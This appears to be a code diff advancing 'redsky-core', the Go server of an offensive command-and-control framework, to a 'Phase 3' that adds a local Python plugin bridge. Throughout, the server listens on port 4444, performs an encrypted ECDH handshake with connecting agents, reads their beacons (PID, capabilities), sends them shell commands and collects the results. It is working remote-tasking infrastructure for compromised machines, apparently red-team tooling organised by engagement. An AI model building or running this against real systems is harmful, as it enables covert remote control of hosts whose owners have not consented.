@@ -1,8 +1,9 @@
 // redsky-core — the framework.
-// Phase 2: TLS + per-session AES-256-GCM via X25519 ECDH.
+// Phase 3: + local plugin bridge to the Python modules.
 package main
 
 import (
+	"context"
 	"encoding/base64"
 	"encoding/json"
 	"flag"
@@ -11,9 +12,11 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
+	"github.com/sk666G/red-sky---arsenal/internal/plugin"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
@@ -24,7 +27,14 @@ func main() {
 	port := flag.Int("port", 4444, "listen port")
 	cmd := flag.String("cmd", "whoami", "command to send to first agent")
 	eng := flag.String("engagement", "default", "engagement name")
+	pluginFlag := flag.String("plugin", "", "run a local plugin instead of listening (format: 'module arg1 arg2 ...')")
+	pluginTimeout := flag.Duration("plugin-timeout", 5*time.Minute, "plugin execution timeout")
 	flag.Parse()
+
+	if *pluginFlag != "" {
+		runPlugin(*pluginFlag, *pluginTimeout)
+		return
+	}
 
 	root, _ := os.UserHomeDir()
 	paths := rsTLS.Paths(filepath.Join(root, ".redsky"), *eng)
@@ -61,15 +71,56 @@ func main() {
 	}
 }
 
-// handleConn runs the ECDH handshake, then the beacon/task/result loop over
-// the encrypted channel.
+// runPlugin runs a Python module locally and prints its output. Phase 3 bridge.
+func runPlugin(spec string, timeout time.Duration) {
+	parts := strings.Fields(spec)
+	if len(parts) == 0 {
+		log.Fatalf("-plugin needs at least a module name")
+	}
+	root, _ := os.UserHomeDir()
+	repo := findRepoRoot()
+	if repo == "" {
+		log.Fatalf("could not find repo root (expected redsky.py in an ancestor of %s)", root)
+	}
+	module := parts[0]
+	args := parts[1:]
+	log.Printf("plugin: %s %v", module, args)
+	out, err := plugin.Invoke(context.Background(), repo, module, args, timeout)
+	if out != "" {
+		fmt.Print(out)
+	}
+	if err != nil {
+		log.Printf("plugin exited with error: %v", err)
+		os.Exit(1)
+	}
+}
+
+// findRepoRoot walks up from cwd looking for redsky.py.
+func findRepoRoot() string {
+	cwd, err := os.Getwd()
+	if err != nil {
+		return ""
+	}
+	dir := cwd
+	for {
+		if _, err := os.Stat(filepath.Join(dir, "redsky.py")); err == nil {
+			return dir
+		}
+		parent := filepath.Dir(dir)
+		if parent == dir {
+			return ""
+		}
+		dir = parent
+	}
+}
+
+// --- everything below is the same as Phase 2 ---
+
 func handleConn(conn net.Conn, cmd string) {
 	defer conn.Close()
 	remote := conn.RemoteAddr().String()
 	log.Printf("agent connected from %s (TLS ok)", remote)
 
-	// --- ECDH handshake ---
-	// 1. Core generates its ephemeral key and sends its pubkey in a hello.
 	coreKey, err := crypto.GenerateEphemeralKey()
 	if err != nil {
 		log.Printf("%s: gen key: %v", remote, err)
@@ -86,7 +137,6 @@ func handleConn(conn net.Conn, cmd string) {
 		return
 	}
 
-	// 2. Read agent's pubkey reply.
 	frame, err := wire.ReadFrame(conn)
 	if err != nil {
 		log.Printf("%s: read hello: %v", remote, err)
@@ -118,8 +168,6 @@ func handleConn(conn net.Conn, cmd string) {
 	}
 	log.Printf("  session key fp: %s", sess.Fingerprint())
 
-	// --- encrypted loop ---
-	// 3. Read beacon (encrypted)
 	frame, err = wire.ReadFrame(conn)
 	if err != nil {
 		log.Printf("%s: read encrypted beacon: %v", remote, err)
@@ -148,7 +196,6 @@ func handleConn(conn net.Conn, cmd string) {
 	log.Printf("  pid:      %d", beacon.Info.PID)
 	log.Printf("  caps:     %v", beacon.Info.Capabilities)
 
-	// 4. Send task (encrypted)
 	task := proto.Task{
 		ID:      fmt.Sprintf("t-%d", time.Now().UnixNano()),
 		Cmd:     cmd,
@@ -161,7 +208,6 @@ func handleConn(conn net.Conn, cmd string) {
 	}
 	log.Printf("sent encrypted task %s: %s", task.ID, task.Cmd)
 
-	// 5. Read result (encrypted)
 	conn.SetReadDeadline(time.Now().Add(45 * time.Second))
 	frame, err = wire.ReadFrame(conn)
 	if err != nil {
@@ -206,5 +252,7 @@ func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 	if err != nil {
 		return err
 	}
-	return wire.WriteFrame(conn, wire.FlagEncrypted, encrypted)
+	return wire.WriteFrame(conn, flagEncrypted(), encrypted)
 }
+
+func flagEncrypted() byte { return 0x02 }
